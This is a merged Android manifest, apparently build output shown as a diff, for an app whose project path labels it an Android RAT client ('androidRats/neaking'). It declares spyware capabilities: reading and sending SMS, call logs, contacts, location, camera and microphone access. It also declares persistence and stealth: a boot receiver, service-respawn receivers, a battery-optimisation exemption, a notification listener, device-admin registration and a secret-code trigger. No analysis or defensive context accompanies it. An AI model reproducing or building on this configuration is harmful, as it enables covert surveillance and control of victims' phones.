@@ -1,0 +1,285 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.neaking"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="18"
+8-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml
+9        android:targetSdkVersion="33" />
+9-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml
+10
+11    <uses-permission android:name="android.permission.WAKE_LOCK" />
+11-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:4:5-68
+11-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:4:22-65
+12    <uses-permission android:name="android.permission.CAMERA" />
+12-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:5:5-65
+12-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:5:22-62
+13    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+13-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:6:5-7:40
+13-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:6:22-78
+14    <uses-permission android:name="android.permission.INTERNET" />
+14-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:8:5-67
+14-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:8:22-64
+15    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+15-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:9:5-79
+15-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:9:22-76
+16    <uses-permission android:name="android.permission.READ_SMS" />
+16-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:10:5-66
+16-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:10:22-64
+17    <uses-permission android:name="android.permission.SEND_SMS" />
+17-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:11:5-66
+17-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:11:22-64
+18    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+18-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:12:5-75
+18-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:12:22-73
+19    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+19-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:13:5-80
+19-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:13:22-78
+20    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+20-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:14:5-75
+20-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:14:22-72
+21    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+21-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:15:5-80
+21-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:15:22-77
+22    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+22-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:16:5-71
+22-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:16:22-69
+23    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+23-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:18:5-94
+23-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:18:22-92
+24    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+24-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:20:5-70
+24-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:20:22-68
+25    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+25-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:21:5-79
+25-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:21:22-77
+26    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+26-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:22:5-81
+26-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:22:22-78
+27    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+27-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:23:5-79
+27-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:23:22-76
+28    <uses-permission android:name="android.permission.READ_CONTACTS" />
+28-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:24:5-72
+28-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:24:22-69
+29    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+29-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:26:5-76
+29-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:26:22-74
+30
+31    <permission
+31-->[androidx.core:core:1.9.0] /home/yunat/.gradle/caches/transforms-3/5aca1a65039b86edde67f6832149c881/transformed/core-1.9.0/AndroidManifest.xml:22:5-24:47
+32        android:name="com.neaking.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+32-->[androidx.core:core:1.9.0] /home/yunat/.gradle/caches/transforms-3/5aca1a65039b86edde67f6832149c881/transformed/core-1.9.0/AndroidManifest.xml:23:9-81
+33        android:protectionLevel="signature" />
+33-->[androidx.core:core:1.9.0] /home/yunat/.gradle/caches/transforms-3/5aca1a65039b86edde67f6832149c881/transformed/core-1.9.0/AndroidManifest.xml:24:9-44
+34
+35    <uses-permission android:name="com.neaking.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+35-->[androidx.core:core:1.9.0] /home/yunat/.gradle/caches/transforms-3/5aca1a65039b86edde67f6832149c881/transformed/core-1.9.0/AndroidManifest.xml:26:5-97
+35-->[androidx.core:core:1.9.0] /home/yunat/.gradle/caches/transforms-3/5aca1a65039b86edde67f6832149c881/transformed/core-1.9.0/AndroidManifest.xml:26:22-94
+36
+37    <application
+37-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:27:5-114:19
+38        android:allowBackup="true"
+38-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:28:9-35
+39        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+39-->[androidx.core:core:1.9.0] /home/yunat/.gradle/caches/transforms-3/5aca1a65039b86edde67f6832149c881/transformed/core-1.9.0/AndroidManifest.xml:28:18-86
+40        android:dataExtractionRules="@xml/data_extraction_rules"
+40-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:30:9-65
+41        android:fullBackupContent="@xml/backup_rules"
+41-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:31:9-54
+42        android:icon="@mipmap/ic_launcher"
+42-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:32:9-43
+43        android:label="@string/app_name"
+43-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:33:9-41
+44        android:networkSecurityConfig="@xml/network_security_config"
+44-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:38:9-69
+45        android:roundIcon="@mipmap/ic_launcher_round"
+45-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:34:9-54
+46        android:supportsRtl="true"
+46-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:35:9-35
+47        android:theme="@style/Theme.Neaking"
+47-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:36:9-45
+48        android:usesCleartextTraffic="true" >
+48-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:29:9-44
+49        <activity
+49-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:40:9-53:20
+50            android:name="com.neaking.MainActivity"
+50-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:41:13-41
+51            android:exported="true"
+51-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:42:13-36
+52            android:theme="@style/Theme.Neaking" >
+52-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:43:13-49
+53            <intent-filter>
+53-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:44:13-48:29
+54                <action android:name="android.intent.action.MAIN" />
+54-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:45:17-69
+54-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:45:25-66
+55
+56                <category android:name="android.intent.category.LAUNCHER" />
+56-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:47:17-77
+56-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:47:27-74
+57            </intent-filter>
+58
+59            <meta-data
+59-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:50:13-52:36
+60                android:name="android.app.lib_name"
+60-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:51:17-52
+61                android:value="" />
+61-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:52:17-33
+62        </activity>
+63
+64        <service
+64-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:54:9-58:15
+65            android:name="com.neaking.MainService"
+65-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:55:13-40
+66            android:enabled="true"
+66-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:56:13-35
+67            android:exported="false" />
+67-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:57:13-37
+68        <service
+68-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:59:9-63:15
+69            android:name="com.neaking.MyService"
+69-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:60:13-38
+70            android:enabled="true"
+70-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:61:13-35
+71            android:exported="false" />
+71-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:62:13-37
+72
+73        <receiver
+73-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:64:9-77:20
+74            android:name="com.neaking.ServiceReceiver"
+74-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:65:13-44
+75            android:enabled="true"
+75-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:66:13-35
+76            android:exported="true"
+76-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:67:13-36
+77            android:label="RestartServiceWhenStopped"
+77-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:68:13-54
+78            android:permission="TODO" >
+78-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:69:13-38
+79            <intent-filter>
+79-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:71:13-73:29
+80                <action android:name="respawnService" />
+80-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:72:17-57
+80-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:72:25-54
+81            </intent-filter>
+82            <intent-filter>
+82-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:74:13-76:29
+83                <action android:name="restartservice" />
+83-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:75:17-57
+83-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:75:25-54
+84            </intent-filter>
+85        </receiver>
+86        <receiver
+86-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:79:9-90:20
+87            android:name="com.neaking.MyReceiver"
+87-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:80:13-39
+88            android:enabled="true"
+88-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:81:13-35
+89            android:exported="true" >
+89-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:82:13-36
+90            <intent-filter>
+90-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:83:13-85:29
+91                <action android:name="android.intent.action.BOOT_COMPLETED" />
+91-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:84:17-79
+91-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:84:25-76
+92            </intent-filter>
+93            <intent-filter>
+93-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:86:13-89:29
+94                <action android:name="android.provider.Telephony.SECRET_CODE" />
+94-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:87:17-81
+94-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:87:25-78
+95
+96                <data android:scheme="android_secret_code" />
+96-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:88:17-62
+96-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:88:23-59
+97            </intent-filter>
+98        </receiver>
+99
+100        <service
+100-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:91:9-98:19
+101            android:name="com.neaking.NotificationListener"
+101-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:91:18-54
+102            android:exported="true"
+102-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:94:13-36
+103            android:label="@string/app_name"
+103-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:92:13-45
+104            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
+104-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:93:13-87
+105            <intent-filter>
+105-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:95:13-97:29
+106                <action android:name="android.service.notification.NotificationListenerService" />
+106-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:96:17-99
+106-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:96:25-96
+107            </intent-filter>
+108        </service>
+109
+110        <receiver
+110-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:99:9-113:20
+111            android:name="com.neaking.DeviceAdminComponent"
+111-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:100:13-49
+112            android:description="@string/device_description"
+112-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:101:13-61
+113            android:exported="true"
+113-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:104:13-36
+114            android:label="@string/device_admin_label"
+114-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:102:13-55
+115            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+115-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:103:13-70
+116            <meta-data
+116-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:105:13-107:49
+117                android:name="android.app.device_admin"
+117-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:106:17-56
+118                android:resource="@xml/admin" />
+118-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:107:17-46
+119
+120            <intent-filter>
+120-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:109:13-112:29
+121                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+121-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:110:17-82
+121-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:110:25-79
+122                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
+122-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:111:17-92
+122-->/opt/lampp/htdocs/androidRats/neaking/neakingClient/app/src/main/AndroidManifest.xml:111:25-89
+123            </intent-filter>
+124        </receiver>
+125
+126        <uses-library
+126-->[androidx.window:window:1.0.0] /home/yunat/.gradle/caches/transforms-3/16e9e631b357a5a0ff19337a562c2779/transformed/jetified-window-1.0.0/AndroidManifest.xml:25:9-27:40
+127            android:name="androidx.window.extensions"
+127-->[androidx.window:window:1.0.0] /home/yunat/.gradle/caches/transforms-3/16e9e631b357a5a0ff19337a562c2779/transformed/jetified-window-1.0.0/AndroidManifest.xml:26:13-54
+128            android:required="false" />
+128-->[androidx.window:window:1.0.0] /home/yunat/.gradle/caches/transforms-3/16e9e631b357a5a0ff19337a562c2779/transformed/jetified-window-1.0.0/AndroidManifest.xml:27:13-37
+129        <uses-library
+129-->[androidx.window:window:1.0.0] /home/yunat/.gradle/caches/transforms-3/16e9e631b357a5a0ff19337a562c2779/transformed/jetified-window-1.0.0/AndroidManifest.xml:28:9-30:40
+130            android:name="androidx.window.sidecar"
+130-->[androidx.window:window:1.0.0] /home/yunat/.gradle/caches/transforms-3/16e9e631b357a5a0ff19337a562c2779/transformed/jetified-window-1.0.0/AndroidManifest.xml:29:13-51
+131            android:required="false" />
+131-->[androidx.window:window:1.0.0] /home/yunat/.gradle/caches/transforms-3/16e9e631b357a5a0ff19337a562c2779/transformed/jetified-window-1.0.0/AndroidManifest.xml:30:13-37
+132
+133        <provider
+133-->[androidx.emoji2:emoji2:1.2.0] /home/yunat/.gradle/caches/transforms-3/d45db48ceed7be9a9afdcc5aa400f768/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:24:9-32:20
+134            android:name="androidx.startup.InitializationProvider"
+134-->[androidx.emoji2:emoji2:1.2.0] /home/yunat/.gradle/caches/transforms-3/d45db48ceed7be9a9afdcc5aa400f768/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:25:13-67
+135            android:authorities="com.neaking.androidx-startup"
+135-->[androidx.emoji2:emoji2:1.2.0] /home/yunat/.gradle/caches/transforms-3/d45db48ceed7be9a9afdcc5aa400f768/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:26:13-68
+136            android:exported="false" >
+136-->[androidx.emoji2:emoji2:1.2.0] /home/yunat/.gradle/caches/transforms-3/d45db48ceed7be9a9afdcc5aa400f768/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:27:13-37
+137            <meta-data
+137-->[androidx.emoji2:emoji2:1.2.0] /home/yunat/.gradle/caches/transforms-3/d45db48ceed7be9a9afdcc5aa400f768/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:29:13-31:52
+138                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+138-->[androidx.emoji2:emoji2:1.2.0] /home/yunat/.gradle/caches/transforms-3/d45db48ceed7be9a9afdcc5aa400f768/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:30:17-75
+139                android:value="androidx.startup" />
+139-->[androidx.emoji2:emoji2:1.2.0] /home/yunat/.gradle/caches/transforms-3/d45db48ceed7be9a9afdcc5aa400f768/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:31:17-49
+140            <meta-data
+140-->[androidx.lifecycle:lifecycle-process:2.4.1] /home/yunat/.gradle/caches/transforms-3/bf771027ade3ce987e75224c37d0f242/transformed/jetified-lifecycle-process-2.4.1/AndroidManifest.xml:31:13-33:52
+141                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+141-->[androidx.lifecycle:lifecycle-process:2.4.1] /home/yunat/.gradle/caches/transforms-3/bf771027ade3ce987e75224c37d0f242/transformed/jetified-lifecycle-process-2.4.1/AndroidManifest.xml:32:17-78
+142                android:value="androidx.startup" />
+142-->[androidx.lifecycle:lifecycle-process:2.4.1] /home/yunat/.gradle/caches/transforms-3/bf771027ade3ce987e75224c37d0f242/transformed/jetified-lifecycle-process-2.4.1/AndroidManifest.xml:33:17-49
+143        </provider>
+144    </application>
+145
+146</manifest>
